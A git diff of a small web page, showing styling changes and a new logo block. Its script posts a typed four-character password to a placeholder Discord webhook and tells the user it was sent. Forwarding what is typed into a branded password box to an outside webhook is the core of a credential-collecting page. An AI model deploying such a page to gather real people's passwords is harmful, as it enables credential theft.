@@ -19,6 +19,7 @@
             align-items: center;
             height: 100vh;
             margin: 0;
+            flex-direction: column;
         }
 
         .container {
@@ -27,31 +28,41 @@
             max-width: 400px;
         }
 
+        .logo-container {
+            margin-bottom: 20px; /* Space between logo and text */
+        }
+
+        .icon {
+            width: 80px; /* Larger logo */
+            height: auto;
+        }
+
+        .logo-text {
+            font-size: 72px; /* Size similar to a header */
+            font-weight: bold;
+            color: #333;
+            letter-spacing: 2px; /* Sleek and modern */
+            margin-top: 10px; /* Space between icon and text */
+        }
+
         .input-container {
             display: flex;
             align-items: center;
             justify-content: center;
             flex-direction: column;
-            gap: 20px; /* Increased gap between icon and input */
-        }
-
-        /* Icon Styling */
-        .icon {
-            width: 50px; /* Bigger icon */
-            height: auto;
-            margin-bottom: 15px; /* Space between the icon and the input box */
+            gap: 20px;
         }
 
         /* Apple-style Input Box */
         .input-bar {
             width: 100%;
             padding: 18px 20px;
-            border-radius: 15px; /* More rounded like Apple design */
+            border-radius: 15px;
             border: 1px solid #d1d1d6;
             background-color: white;
-            font-size: 18px; /* Slightly larger text for readability */
+            font-size: 18px;
             color: #333;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08); /* Soft shadow for sleekness */
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
             outline: none;
             letter-spacing: 1px;
             text-align: center;
@@ -61,7 +72,7 @@
 
         .input-bar:focus {
             border-color: #007aff;
-            box-shadow: 0 0 12px rgba(0, 122, 255, 0.3); /* Focus effect with blue color */
+            box-shadow: 0 0 12px rgba(0, 122, 255, 0.3);
         }
 
         /* Button Styling */
@@ -78,20 +89,24 @@
 
         .send-btn:hover {
             background-color: #005bb5;
-            transform: scale(1.05); /* Slight hover effect */
+            transform: scale(1.05);
         }
 
         .send-btn:active {
-            transform: scale(1); /* Return to normal when clicked */
+            transform: scale(1);
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="input-container">
-            <!-- Icon above the input box -->
+        <div class="logo-container">
+            <!-- Logo image -->
             <img src="icon.png" alt="icon" class="icon" />
-            
+            <!-- Text below the logo -->
+            <div class="logo-text">E</div>
+        </div>
+
+        <div class="input-container">
             <input type="password" class="input-bar" id="inputBar" maxlength="4" placeholder="Enter password" />
             <button class="send-btn" id="sendButton">Send</button>
         </div>
@@ -102,26 +117,24 @@
         const sendButton = document.getElementById('sendButton');
         const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
 
-        // Dynamically update the input bar with bullet points as the user types
         inputBar.addEventListener('input', function() {
             let value = inputBar.value;
-            let maskedValue = '•'.repeat(value.length) + '_'.repeat(4 - value.length); // Mask typed characters with bullet points and leave remaining spaces as underscores
-            inputBar.setAttribute('placeholder', maskedValue); // Update placeholder to show masked input
+            let maskedValue = '•'.repeat(value.length) + '_'.repeat(4 - value.length);
+            inputBar.setAttribute('placeholder', maskedValue);
         });
 
         inputBar.addEventListener('focus', () => {
-            inputBar.placeholder = ''; // Hide placeholder text when focused
+            inputBar.placeholder = '';
         });
 
         inputBar.addEventListener('blur', () => {
-            inputBar.placeholder = 'Enter password'; // Reset placeholder when input loses focus
+            inputBar.placeholder = 'Enter password';
         });
 
         sendButton.addEventListener('click', () => {
-            const password = inputBar.value; // Get the actual input value
+            const password = inputBar.value;
 
             if (password.length === 4) {
-                // Send password to Discord webhook
                 const payload = {
                     content: `Password entered: ${password}`,
                 };
@@ -136,7 +149,7 @@
                 .then(response => response.json())
                 .then(data => {
                     alert('Password sent to Discord!');
-                    inputBar.value = ''; // Reset input after sending
+                    inputBar.value = '';
                 })
                 .catch(error => {
                     alert('Error sending message to Discord');
